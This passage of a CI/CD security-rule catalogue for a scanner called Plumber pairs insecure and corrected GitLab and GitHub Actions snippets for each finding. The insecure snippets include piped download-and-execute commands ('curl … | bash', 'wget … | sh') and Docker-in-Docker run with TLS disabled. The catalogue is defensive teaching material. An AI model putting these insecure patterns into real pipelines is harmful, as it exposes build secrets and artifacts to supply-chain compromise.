        "Security jobs are identified by matching job names against `securityJobPatterns` (wildcards supported). Customize patterns to match your pipeline's security jobs.",
        "The `allowFailureMustBeFalse` sub-control is off by default because GitLab templates ship with `allow_failure: true`. Enable it if your org wants security checks to block the pipeline.",
        "`rulesMustNotBeRedefined` and `whenMustNotBeManual` are on by default since these patterns effectively disable scanning.",
        "Each sub-control can be toggled independently for gradual adoption.",
      ],
      relatedCodes: ["ISSUE-408", "ISSUE-409", "ISSUE-406"],
    },
    github: {
      title: "Security job weakened",
      category: "Pipeline Composition",
      severity: "critical",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Security jobs must not be weakened",
      controlConfigKey: "securityJobsMustNotBeWeakened",
      description:
        "A security-scan job in a GitHub Actions workflow is neutralized via `continue-on-error: true`, a narrow `if:` condition that never triggers, or a trigger filter that effectively skips it.",
      impact:
        "A weakened security scan gives a false sense of compliance — the pipeline reports green, but the scan either never ran or its findings were silently ignored. Same OWASP CICD-SEC-4 pattern as on GitLab.",
      remediation:
        "Remove the weakening pattern. Security scans should fail the pipeline, not pass with warnings.",
      badExample: `# .github/workflows/codeql.yml — ❌ Weakened
jobs:
  analyze:
    runs-on: ubuntu-latest
    continue-on-error: true   # ← findings ignored
    if: github.event_name == 'workflow_dispatch'   # ← only manual
    steps:
      - uses: github/codeql-action/analyze@v3`,
      badExampleCaption: "Findings are ignored, and the job only runs on manual dispatch.",
      goodExample: `# .github/workflows/codeql.yml — ✅ Runs on every push, fails on findings
jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
    steps:
      - uses: github/codeql-action/analyze@4e828ff8d448a8a6e532957b1811f387a63867e8 # v3.27.6

# .plumber.yaml
github:
  controls:
    securityJobsMustNotBeWeakened:
      enabled: true
      securityJobPatterns: [codeql, semgrep, snyk, trivy]`,
      goodExampleCaption: "Pipeline fails the merge if CodeQL finds an issue.",
      tips: [
        "Plumber identifies security jobs by glob-matching against `<workflow-file-basename-without-.yml>/<job-id>`. The full pattern reference (four shapes, real-world slash-form examples) lives in the [CLI documentation's Security Job Weakening Detection section](/docs/cli).",
        "Customise `securityJobPatterns` for your stack. The defaults ship wildcard-wrapped (`*codeql*`, `*-sast`, `*scan*`, ...) so they catch project-specific prefixes; you can drop the wildcards once you know your workflow-file layout.",
        "`continue-on-error: true` on the workflow level is fine; on a security scan job it isn't.",
      ],
      relatedCodes: ["ISSUE-211", "ISSUE-904"],
    },
  },

  "ISSUE-411": {
    code: "ISSUE-411",
    gitlab: {
      title: "Unverified script execution",
      category: "Pipeline Composition",
      severity: "high",
      fixDuration: "medium",
      controlName: "Pipeline must not execute unverified scripts",
      controlConfigKey: "pipelineMustNotExecuteUnverifiedScripts",
      productScope: "cli",
      description:
        "A CI/CD job downloads and immediately executes a script from the internet without verifying its integrity. Patterns like `curl | bash`, `wget | sh`, or download-then-execute sequences are a well-documented supply chain attack vector.",
      impact:
        "An attacker who compromises the remote URL can serve a modified script that exfiltrates CI/CD secrets (`$CI_JOB_TOKEN`, deploy keys, custom variables), modifies source code, or injects backdoors into build artifacts. Maps to OWASP CICD-SEC-3 (Dependency Chain Abuse) and CICD-SEC-8 (Ungoverned Usage of 3rd Party Services).",
      remediation:
        "Download the script to a file first, verify its checksum against a known-good value, then execute it. Alternatively, vendor the script into your repository or use a trusted package manager.",
      badExample: `# .gitlab-ci.yml — ❌ Download and execute without verification
setup:
  script:
    - curl -sSL https://example.com/install.sh | bash

tools:
  script:
    - wget -qO- https://get.example.com | sh

deploy:
  script:
    - curl -o deploy.sh https://example.com/deploy.sh
    - bash deploy.sh`,
      badExampleCaption: "Scripts are downloaded and executed without any integrity check.",
      goodExample: `# .gitlab-ci.yml — ✅ Verify integrity before execution
setup:
  script:
    - curl -sSL -o install.sh https://example.com/install.sh
    - echo "a]3f8...expected_sha256  install.sh" | sha256sum -c -
    - bash install.sh

tools:
  script:
    # Vendored script committed to the repo
    - bash scripts/setup-tools.sh

deploy:
  script:
    - curl -o deploy.sh https://example.com/deploy.sh
    - gpg --verify deploy.sh.sig deploy.sh
    - bash deploy.sh

# .plumber.yaml
# pipelineMustNotExecuteUnverifiedScripts:
#   enabled: true
#   trustedUrls:
#     - https://internal-artifacts.example.com/*`,
      goodExampleCaption: "Scripts are verified with checksums or GPG signatures before execution.",
      tips: [
        "Lines that include checksum verification (e.g., `sha256sum`, `gpg --verify`) between download and execution are automatically excluded.",
        "Add trusted URL patterns to `trustedUrls` (supports wildcards) to suppress findings for known-good internal sources.",
        "Consider vendoring external scripts into your repository for full control over their content.",
        "Use a trusted package manager (apt, brew, pip) instead of raw script downloads when possible.",
      ],
      relatedCodes: ["ISSUE-401", "ISSUE-204"],
    },
  },

  "ISSUE-412": {
    code: "ISSUE-412",
    gitlab: {
      title: "Docker-in-Docker service detected",
      category: "Pipeline Composition",
      severity: "high",
      fixDuration: "medium",
      productScope: "cli",
      controlName: "Pipeline must not use Docker-in-Docker",
      controlConfigKey: "pipelineMustNotUseDockerInDocker",
      description:
        "A CI/CD job uses a Docker-in-Docker (dind) service. On shared runners running in privileged mode, this creates a Docker daemon inside the CI container that enables container escape, lateral movement between jobs, and access to secrets from other projects on the same runner.",
      impact:
        "Docker-in-Docker in privileged mode grants near-root access to the host. An attacker (or a compromised dependency) can escape the container, list and inspect other containers on the runner, read volumes mounted by other CI jobs (potentially containing secrets), and probe the runner's internal network.",
      remediation:
        "Replace Docker-in-Docker with a rootless container build tool. Kaniko builds container images inside a container without requiring a Docker daemon or privileged mode.",
      badExample: `# .gitlab-ci.yml — ❌ Uses Docker-in-Docker service
build-image:
  image: docker:27
  services:
    - docker:27-dind
  variables:
    DOCKER_HOST: tcp://docker:2376
    DOCKER_TLS_CERTDIR: "/certs"
  script:
    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .
    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA`,
      badExampleCaption: "This job runs a Docker daemon inside the CI container, requiring privileged mode on the runner.",
      goodExample: `# .gitlab-ci.yml — ✅ Uses Kaniko (no privileged mode needed)
build-image:
  image:
    name: gcr.io/kaniko-project/executor:v1.23.2-debug
    entrypoint: [""]
  script:
    - /kaniko/executor
      --context $CI_PROJECT_DIR
      --dockerfile $CI_PROJECT_DIR/Dockerfile
      --destination $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA

# .plumber.yaml
# pipelineMustNotUseDockerInDocker:
#   enabled: true
#   detectInsecureDaemon: true`,
      goodExampleCaption: "Kaniko builds container images without requiring a Docker daemon or privileged mode.",
      tips: [
        "Kaniko and Buildah are the most common alternatives to Docker-in-Docker for building container images in CI/CD.",
        "If Docker-in-Docker is truly required, ensure it runs on dedicated (not shared) runners with proper network isolation.",
        "The `detectInsecureDaemon` option (default: true) also flags jobs where TLS is disabled between the CI job and the DinD daemon.",
        "This control inspects the `services:` declaration in the CI configuration. A Docker daemon started manually from `script:` (e.g., `dockerd &`) or embedded in a custom image is not detected (known limitation).",
        "Only images with `docker:` prefix and a tag containing `dind` or `latest` are matched. Renamed or aliased DinD images (e.g., `myregistry.com/custom-builder:stable`) are not detected.",
      ],
      relatedCodes: ["ISSUE-413", "ISSUE-101"],
    },
    github: {
      title: "Docker-in-Docker service detected",
      category: "Pipeline Composition",
      severity: "high",
      fixDuration: "medium",
      productScope: "cli",
      controlName: "Workflow must not use Docker-in-Docker",
      controlConfigKey: "pipelineMustNotUseDockerInDocker",
      description:
        "A workflow job declares a `docker:dind` service. On self-hosted runners with privileged mode enabled, this opens a container-escape path; on GitHub-hosted runners it requires the `--privileged` flag to actually function.",
      impact:
        "A DinD service runs a full Docker daemon inside the job container. On shared self-hosted runners this means a compromised job can list other containers, mount their volumes, and exfiltrate secrets across jobs.",
      remediation:
        "Replace the DinD service with a rootless container builder. `docker/build-push-action` works without DinD by using BuildKit; Kaniko is another drop-in replacement.",
      badExample: `# .github/workflows/image.yml — ❌ Docker-in-Docker service
jobs:
  build:
    runs-on: [self-hosted, privileged]
    services:
      dind:
        image: docker:27-dind
        options: --privileged
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t myimg .`,
      badExampleCaption: "The job depends on a privileged DinD service.",
      goodExample: `# .github/workflows/image.yml — ✅ BuildKit via docker/build-push-action
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - uses: docker/build-push-action@v6
        with:
          context: .
          push: false
          tags: myimg:\${{ github.sha }}

# .plumber.yaml
github:
  controls:
    pipelineMustNotUseDockerInDocker:
      enabled: true`,
      goodExampleCaption: "BuildKit runs without a privileged daemon and is the GitHub-recommended path.",
      tips: [
        "If DinD is unavoidable (rare on GitHub-hosted runners), use Kaniko or Buildah instead — both run rootless.",
        "Pair with ISSUE-413 to catch insecure daemon configuration when DinD is actually present.",
      ],
      relatedCodes: ["ISSUE-413", "ISSUE-101"],
    },
  },

  "ISSUE-413": {
    code: "ISSUE-413",
    gitlab: {
      title: "Docker-in-Docker with insecure daemon configuration",
      category: "Pipeline Composition",
      severity: "high",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Pipeline must not use Docker-in-Docker",
      controlConfigKey: "pipelineMustNotUseDockerInDocker",
      description:
        "A CI/CD job uses Docker-in-Docker with an insecure daemon configuration. Setting `DOCKER_TLS_CERTDIR` to an empty string or using `DOCKER_HOST` with `tcp://docker:2375` disables TLS encryption between the CI job and the Docker daemon.",
      impact:
        "Without TLS, all communication between the CI job and the Docker daemon is in plaintext. On shared infrastructure, this allows network-level eavesdropping, man-in-the-middle attacks, and Docker API command injection by other containers on the same network.",
      remediation:
        "If Docker-in-Docker is required, do not set `DOCKER_TLS_CERTDIR` to an empty string and use `tcp://docker:2376` (TLS) instead of `tcp://docker:2375` (plaintext). Prefer Kaniko or Buildah to avoid this pattern entirely.",
      badExample: `# .gitlab-ci.yml — ❌ DinD with TLS disabled
build-image:
  image: docker:27
  services:
    - docker:27-dind
  variables:
    DOCKER_TLS_CERTDIR: ""
    DOCKER_HOST: tcp://docker:2375
  script:
    - docker build -t $CI_REGISTRY_IMAGE .
    - docker push $CI_REGISTRY_IMAGE`,
      badExampleCaption: "TLS is disabled, exposing all Docker API traffic in plaintext.",
      goodExample: `# .gitlab-ci.yml — ✅ DinD with TLS enabled (if DinD is truly required)
build-image:
  image: docker:27
  services:
    - docker:27-dind
  variables:
    DOCKER_TLS_CERTDIR: "/certs"
    DOCKER_HOST: tcp://docker:2376
    DOCKER_TLS_VERIFY: 1
    DOCKER_CERT_PATH: "/certs/client"
  script:
    - docker build -t $CI_REGISTRY_IMAGE .
    - docker push $CI_REGISTRY_IMAGE

# Better: use Kaniko instead of DinD entirely
# (see ISSUE-412 for examples)`,
      goodExampleCaption: "TLS is enabled with proper certificate configuration.",
      tips: [
        "Port 2375 is Docker's unencrypted port. Port 2376 is the TLS-encrypted port.",
        "Setting `DOCKER_TLS_CERTDIR: \"\"` explicitly disables TLS certificate generation in the DinD service.",
        "This issue only fires when a DinD service is also present in the same job. Insecure variables without DinD are not flagged.",
        "The best fix is to replace Docker-in-Docker entirely with Kaniko or Buildah (see ISSUE-412).",
        "Only `DOCKER_TLS_CERTDIR` and `DOCKER_HOST` variables declared in YAML (`variables:`) are checked. TLS disabled via `dockerd` flags in `script:` or via runtime exports in `before_script:` is not detected (known limitation).",
        "Only port 2375 is flagged as insecure. Custom non-TLS ports (e.g., `tcp://docker:12345`) are not detected.",
      ],
      relatedCodes: ["ISSUE-412", "ISSUE-101"],
    },
    github: {
      title: "Docker-in-Docker with insecure daemon configuration",
      category: "Pipeline Composition",
      severity: "high",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Workflow must not use Docker-in-Docker",
      controlConfigKey: "pipelineMustNotUseDockerInDocker",
      description:
        "A workflow's DinD service is wired with TLS disabled (`DOCKER_TLS_CERTDIR=\"\"`, `DOCKER_HOST=tcp://docker:2375`).",
      impact:
        "Without TLS, the workflow talks to the Docker daemon in plaintext over the runner's internal network. Another job on the same self-hosted runner can intercept the traffic and inject Docker API commands.",
      remediation:
        "If DinD must stay, use the TLS port 2376 and let DinD generate the certs (`DOCKER_TLS_CERTDIR=/certs`). The better fix is to remove DinD entirely (see ISSUE-412).",
      badExample: `# .github/workflows/image.yml — ❌ TLS disabled
jobs:
  build:
    runs-on: [self-hosted]
    services:
      dind:
        image: docker:27-dind
        env:
          DOCKER_TLS_CERTDIR: ""
        options: --privileged
    env:
      DOCKER_HOST: tcp://docker:2375
    steps:
      - run: docker build -t myimg .`,
      badExampleCaption: "Plaintext API traffic between job and daemon on the runner network.",
      goodExample: `# .github/workflows/image.yml — ✅ TLS enabled (or, better, no DinD)
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - run: docker build -t myimg .  # uses BuildKit, no separate daemon`,
      goodExampleCaption: "BuildKit avoids the DinD socket entirely.",
      tips: [
        "Port 2375 is plaintext; 2376 is TLS.",
        "Plumber only flags this when a `dind` service is actually present in the same job.",
      ],
      relatedCodes: ["ISSUE-412"],
    },
  },

  "ISSUE-508": {
    code: "ISSUE-508",
    gitlab: {
      title: "Members' role quotas are not respected for groups",
      category: "Access and Authorization",
      severity: "medium",
      fixDuration: "medium",
      productScope: "platform",
      controlName: "Number of group members must respect a quota",
      controlConfigKey: "numberOfGroupMembersMustRespectQuota",
      description:
        "The number of members assigned to specific roles in a GitLab group does not respect the quotas defined in your Policy controls.",
      impact:
        "Ignoring role quotas can lead to uncontrolled access to project resources, weakening security and governance policies. For example, if too many users are assigned as Owners or Maintainers, it increases the risk of unauthorized changes and security misconfigurations.",
      remediation:
        "Review and adjust the members' role assignments in the group to comply with the defined quotas. Ensure that only the necessary members have privileges.",
      badExample: `# GitLab group members — ❌ Too many Owners
# Group > Members:
#
#   alice  → Owner
#   bob    → Owner
#   carol  → Owner
#   dave   → Owner    ← 4 Owners (max allowed: 2)`,
      badExampleCaption: "The group has 4 owners, exceeding the allowed quota of 2.",
      goodExample: `# GitLab group members — ✅ Quotas respected
# Group > Members:
#
#   alice  → Owner
#   bob    → Owner
#   carol  → Maintainer  ← Downgraded to meet quota
#   dave   → Maintainer  ← Downgraded to meet quota`,
      goodExampleCaption: "Group member roles are adjusted to comply with the defined quota.",
      tips: [
        "Group owners inherit owner access to all projects in the group — limit this role to trusted admins.",
        "Use subgroups to apply different access policies to different teams.",
        "Regularly review group membership when team members change roles or leave the organization.",
      ],
      relatedCodes: ["ISSUE-507"],
    },
  },
  "ISSUE-701": {
    code: "ISSUE-701",
    github: {
      title: "Third-party action is not pinned by commit SHA",
      category: "Third-party actions",
      severity: "high",
      fixDuration: "medium",
      productScope: "cli",
      controlName: "Third-party actions must be pinned by commit SHA",
      controlConfigKey: "actionsMustBePinnedByCommitSha",
      description:
        "A workflow step references a third-party action by a mutable ref (tag like `v4` or branch like `main`) instead of a 40-character commit SHA.",
      impact:
        "Tag and branch refs are mutable. The March 2025 `tj-actions/changed-files` compromise (CVE-2025-30066) retagged a stable version to point at malicious code that exfiltrated repo secrets from every CI run consuming the action — and there were thousands.",
      remediation:
        "Replace each `uses: owner/repo@vX` with `uses: owner/repo@<40-char-sha>  # vX.Y.Z`. Use Dependabot or Renovate to bump the SHA when upstream releases.",
      badExample: `# .github/workflows/test.yml — ❌ Mutable refs everywhere
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: tj-actions/changed-files@v45
      - uses: some-third-party/action@main`,
      badExampleCaption: "Any of these tags can be moved upstream and start serving different code.",
      goodExample: `# .github/workflows/test.yml — ✅ Pinned by SHA
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: tj-actions/changed-files@cc733854b1f224978ef800d29e4709d5ee2883e4 # v46.0.5
      - uses: some-third-party/action@a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4 # v2.1.0

# .plumber.yaml — opt in + skip first-party actions
github:
  controls:
    actionsMustBePinnedByCommitSha:
      enabled: true
      trustedOwners: [actions, github]`,
      goodExampleCaption: "Every `uses:` carries a full SHA; the trailing comment names the release.",
      tips: [
        "List `actions` and `github` under `trustedOwners` to skip the rule for first-party GitHub-owned actions.",
        "Local actions (`uses: ./.github/actions/foo`) are always exempt — they live in the same repo.",
        "Pair with ISSUE-702–115 for a complete supply-chain ruleset (archived repos, impostor SHAs, stale pins, etc.).",
      ],
      relatedCodes: ["ISSUE-702", "ISSUE-707", "ISSUE-708", "ISSUE-709", "ISSUE-703"],
    },
  },

  "ISSUE-702": {
    code: "ISSUE-702",
    github: {
      title: "Action is hosted in an archived repository",
      category: "Third-party actions",
      severity: "high",
      fixDuration: "medium",
      productScope: "cli",
      controlName: "Actions must not reference archived repositories",
      controlConfigKey: "actionsMustNotBeArchived",
      description:
        "A workflow step uses a third-party action (`uses: owner/repo@ref`) whose upstream repository is archived on GitHub. Plumber scans committed `.github/workflows/*.{yml,yaml}` only, queries `GET /repos/{owner}/{repo}` for the `archived` flag, and caches one result per `owner/repo` (not per ref). Requires `gh auth login` or `GH_TOKEN`; without authentication the control abstains and emits no finding.",
      impact:
        "Archived repositories don't receive security fixes. Any vulnerability discovered after the archive date stays open forever — but the action keeps running inside your workflow with whatever permissions you grant it. Pinning by SHA does not save the caller either: the last maintainer (or whoever later acquires the namespace) can still push new code under the same repository name.",
      remediation:
        "Replace the archived action with a maintained alternative, fork it and patch it yourself, or vendor the action's source into your repository under `.github/actions/`. If the action is small enough to read in one sitting, inlining the equivalent shell logic removes the supply-chain dependency entirely.",
      badExample: `# .github/workflows/release.yml — ❌ Archived upstream
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: archived-org/release-action@v1   # repo archived 2023`,
      badExampleCaption: "The upstream repo is archived; the SHA-pinned version is frozen too, including its bugs.",
      goodExample: `# .github/workflows/release.yml — ✅ Maintained alternative
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: softprops/action-gh-release@01570a1f39cb168c169c802c3bceb9e93fb10974 # v2

# .plumber.yaml
github:
  controls:
    actionsMustNotBeArchived:
      enabled: true`,
      goodExampleCaption: "Active project receiving updates.",
      tips: [
        "Scope is step-level `uses:` in your workflow files only. Job-level reusable-workflow `uses:` lines, local `./.github/actions/*`, and `docker://` steps are out of scope.",
        "Without `gh` / `GH_TOKEN`, the rule abstains on every ref (degraded contract, no false positives). This is not a clean pass.",
        "Does not fetch callee reusable-workflow YAML from other repositories; only what is committed under `.github/workflows/` in the analyzed ref.",
        "The PBOM tags each archived include with `archived: true` (JSON) / `plumber:archived` (CycloneDX) so dashboards can dedupe across multiple callers of the same abandoned action.",
      ],
      status: "shipping",
      relatedCodes: ["ISSUE-701", "ISSUE-703"],
    },
  },

  "ISSUE-707": {
    code: "ISSUE-707",
    github: {
      title: "Pinned SHA does not exist in upstream repository",
      category: "Third-party actions",
      severity: "high",
      fixDuration: "medium",
      productScope: "cli",
      controlName: "Pinned SHA must exist upstream",
      controlConfigKey: "actionRefsMustExistUpstream",
      description:
        "A workflow pins an action to a SHA that does not exist in the upstream repository's commit history (or in any of its branches/tags).",
      impact:
        "An impostor SHA means the workflow could be installing a commit from a fork that's later been deleted or renamed. The pinned SHA still resolves on GitHub's CDN for a while but represents code that doesn't belong to the apparent owner anymore.",
      remediation:
        "Resolve the action's current latest release upstream, copy its real SHA, and update the `uses:` line accordingly.",
      badExample: `# .github/workflows/test.yml — ❌ SHA missing upstream
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: owner/repo@deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
        # ^ not present in owner/repo's history`,
      badExampleCaption: "The pinned SHA does not exist in the upstream repository's history.",
      goodExample: `# .github/workflows/test.yml — ✅ SHA resolves upstream
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: owner/repo@a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4 # v2.1.0`,
      goodExampleCaption: "SHA matches a real tagged commit upstream.",
      tips: [
        "Get the right SHA with `gh api repos/OWNER/REPO/git/refs/tags/vX.Y.Z`.",
        "This rule needs upstream lookup — running offline or against a private upstream where the token has no access will report `partialControls` (abstain).",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-701", "ISSUE-708"],
    },
  },

  "ISSUE-708": {
    code: "ISSUE-708",
    github: {
      title: "Action version comment does not match the resolved SHA",
      category: "Third-party actions",
      severity: "medium",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Action version comment must match SHA",
      controlConfigKey: "actionPinCommentsMustMatchSha",
      description:
        "The `# vX.Y.Z` comment after a SHA-pinned action does not correspond to the SHA the ref actually resolves to upstream.",
      impact:
        "A wrong comment misleads reviewers and Dependabot/Renovate. Someone reading the file thinks they're on v4.2.0 when they're actually on a v3.x SHA — and the next 'bump v4.2.0 → v4.3.0' PR silently jumps two majors.",
      remediation:
        "Update the comment to the version that actually corresponds to the SHA, or update the SHA to the latest of the version named in the comment.",
      badExample: `# .github/workflows/test.yml — ❌ Comment lies
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v3
        # ^ but that SHA is actually v4.2.2`,
      badExampleCaption: "The comment says v3; the SHA is from v4.2.2.",
      goodExample: `# .github/workflows/test.yml — ✅ Comment matches SHA
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2`,
      goodExampleCaption: "Comment names the exact tag that resolves to the pinned SHA.",
      tips: [
        "Dependabot keeps the comment in sync automatically when updating SHA pins.",
        "If you write the comment by hand, run `gh api repos/OWNER/REPO/commits/<sha>` and check the `committer.date` / surrounding tag.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-701", "ISSUE-707", "ISSUE-709"],
    },
  },

  "ISSUE-709": {
    code: "ISSUE-709",
    github: {
      title: "Pinned action is stale relative to the latest release",
      category: "Third-party actions",
      severity: "low",
      fixDuration: "medium",
      productScope: "cli",
      controlName: "Pinned actions must not be stale",
      controlConfigKey: "actionPinsMustNotBeStale",
      description:
        "An action is pinned by SHA but the SHA is several releases behind the latest upstream tag.",
      impact:
        "Pin-by-SHA without an update cadence means missed security fixes from upstream. A `v4.0.0` SHA from 2023 doesn't include the 2025 security patches every other consumer already has.",
      remediation:
        "Update the pinned SHA to the latest stable release of the action. Dependabot or Renovate can automate this with PRs you can review individually.",
      badExample: `# .github/workflows/test.yml — ❌ Far behind latest
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab # v3.5.2
        # ^ latest is v4.2.2 (multiple security fixes since)`,
      badExampleCaption: "Action pinned to a 2-year-old SHA; upstream has shipped multiple security releases since.",
      goodExample: `# .github/workflows/test.yml — ✅ Up-to-date
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2`,
      goodExampleCaption: "Pinned to the latest stable release.",
      tips: [
        "Enable Dependabot for `package-ecosystem: github-actions` to get automatic update PRs.",
        "The stale-window threshold is configurable via `actionsMustBePinnedByCommitSha.staleAfterReleases`.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-701", "ISSUE-708"],
    },
  },

  "ISSUE-710": {
    code: "ISSUE-710",
    github: {
      title: "Action ref collides with both a tag and a branch upstream",
      category: "Third-party actions",
      severity: "medium",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Action ref must not be ambiguous",
      controlConfigKey: "actionRefsMustNotCollide",
      description:
        "A workflow uses a symbolic action ref (e.g. `uses: owner/repo@v1`) where the same name exists upstream as both a tag and a branch.",
      impact:
        "GitHub's ref-resolution order makes the outcome implementation-defined and timing-dependent. An attacker who can push to a branch named `v1` upstream may be able to have CI pick the branch over the tag under specific conditions, swapping a release for arbitrary code.",
      remediation:
        "Pin the action by commit SHA (ISSUE-701). If you must use a symbolic ref, ensure the upstream repository's tags don't share names with branches.",
      badExample: `# .github/workflows/test.yml — ❌ Ambiguous ref
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: owner/repo@v1
        # ^ \`v1\` exists as both a tag AND a branch upstream`,
      badExampleCaption: "The action ref resolves to either a tag or a branch depending on GitHub's internal order.",
      goodExample: `# .github/workflows/test.yml — ✅ SHA-pinned removes the ambiguity
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: owner/repo@a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4 # v1.0.0`,
      goodExampleCaption: "Pin by SHA — refs don't matter.",
      tips: [
        "This rule fires regardless of the `actionsMustBePinnedByCommitSha` opt-in — collisions are a clear bug.",
        "Upstream maintainers should delete the branch (or rename the tag) to clear the collision for all consumers.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-701"],
    },
  },

  "ISSUE-703": {
    code: "ISSUE-703",
    github: {
      title: "Action version carries a published security advisory",
      category: "Third-party actions",
      severity: "critical",
      fixDuration: "medium",
      productScope: "cli",
      controlName: "Actions must not carry known CVEs",
      controlConfigKey: "actionsMustNotCarryKnownCVEs",
      description:
        "A step-level `uses: owner/repo@ref` in committed workflow YAML matches a published GitHub Advisory Database entry for the `actions` ecosystem. Plumber queries `/advisories?ecosystem=actions&affects=<owner>/<repo>` once per `owner/repo` (cached). When the pinned ref resolves to a semver tag, advisories are filtered by `vulnerable_version_range`; unresolvable commit SHAs may match any advisory for that repo (conservative). Requires `gh` / `GH_TOKEN`; without auth the control abstains.",
      impact:
        "A known-vulnerable action running in CI means the workflow inherits the published vulnerability class (RCE, secret exfiltration, privilege escalation, depending on the advisory). The blast radius is the union of the job's permissions and the secrets the workflow can read.",
      remediation:
        "Upgrade to a version outside the advisory's affected range (the advisory page lists a fixed-in version) and re-pin by SHA so a future retag cannot silently revert the fix. Configure Dependabot with `package-ecosystem: github-actions` to receive PR alerts when new advisories land against actions you already use.",
      badExample: `# .github/workflows/release.yml — ❌ Affected by GHSA-mrrh-fwg8-r2c3
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: tj-actions/changed-files@v45.0.0   # CVE-2025-30066`,
      badExampleCaption: "The pinned version is in the affected range of a published advisory.",
      goodExample: `# .github/workflows/release.yml — ✅ Patched version pinned by SHA
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: tj-actions/changed-files@cc733854b1f224978ef800d29e4709d5ee2883e4 # v46.0.5

# .plumber.yaml
github:
  controls:
    actionsMustNotCarryKnownCVEs:
      enabled: true`,
      goodExampleCaption: "Patched release pinned by SHA.",
      tips: [
        "Tag pins (e.g. `@v45`) are semver-checked against each advisory's affected range. SHA pins without a resolvable release tag may flag if any advisory exists for that `owner/repo`.",
        "Same scope limits as ISSUE-702: step `uses:` only, static YAML, no nested composite internals, no reusable-workflow callee files unless they live in this repo's `.github/workflows/`.",
        "Without API auth the rule abstains (not a pass). Pair with Dependabot `package-ecosystem: github-actions` for ongoing alerts.",
        "The PBOM tags affected includes with `hasCve: true` plus `advisories: [GHSA-…]` (JSON) / `plumber:has-cve` plus `plumber:advisories` properties (CycloneDX).",
      ],
      status: "shipping",
      relatedCodes: ["ISSUE-701", "ISSUE-702", "ISSUE-709"],
    },
  },

  "ISSUE-711": {
    code: "ISSUE-711",
    github: {
      title: "Action duplicates a runner built-in",
      category: "Third-party actions",
      severity: "low",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Avoid actions that duplicate runner built-ins",
      controlConfigKey: "actionsMustNotDuplicateRunnerBuiltins",
      description:
        "A workflow installs a third-party action that re-implements functionality already provided by the runner image (e.g. installing the `gh` CLI when it's pre-installed, or `jq` when GitHub-hosted runners include it).",
      impact:
        "Every third-party action is supply-chain surface. A `gh` or `jq` installer action provides no value over `run: gh ...` / `run: jq ...` directly, but each adds a fresh dependency you'd need to audit on every release.",
      remediation:
        "Remove the action and call the runner's built-in tool directly from a `run:` step.",
      badExample: `# .github/workflows/release.yml — ❌ Reinventing the runner's gh CLI
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: cli/cli-action@v1   # gh is already on the runner
        with:
          gh_args: release create v1.0.0`,
      badExampleCaption: "A third-party wrapper around `gh` — extra supply-chain surface for no gain.",
      goodExample: `# .github/workflows/release.yml — ✅ Use the runner's gh directly
jobs:
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: gh release create v1.0.0
        env:
          GH_TOKEN: \${{ github.token }}`,
      goodExampleCaption: "Calls the pre-installed `gh` directly.",
      tips: [
        "GitHub-hosted runners come with `gh`, `jq`, `yq`, `aws`, `gcloud`, `kubectl`, `docker` and many others pre-installed. See https://github.com/actions/runner-images.",
        "Self-hosted runners can vary — check what's on yours before disabling the rule.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-701"],
    },
  },

  "ISSUE-704": {
    code: "ISSUE-704",
    github: {
      title: "Container registry credentials are hardcoded",
      category: "Third-party actions",
      severity: "critical",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Container registry credentials must not be hardcoded",
      controlConfigKey: "containerCredentialsMustComeFromSecrets",
      description:
        "A workflow passes a literal username and password to `docker/login-action` (or an equivalent `docker login` shell command) instead of pulling them from `secrets`.",
      impact:
        "Hardcoded registry credentials are visible to every collaborator, in every fork, and in workflow logs until they're rotated. A leaked registry token typically grants push access — meaning supply-chain compromise of every consumer of those images.",
      remediation:
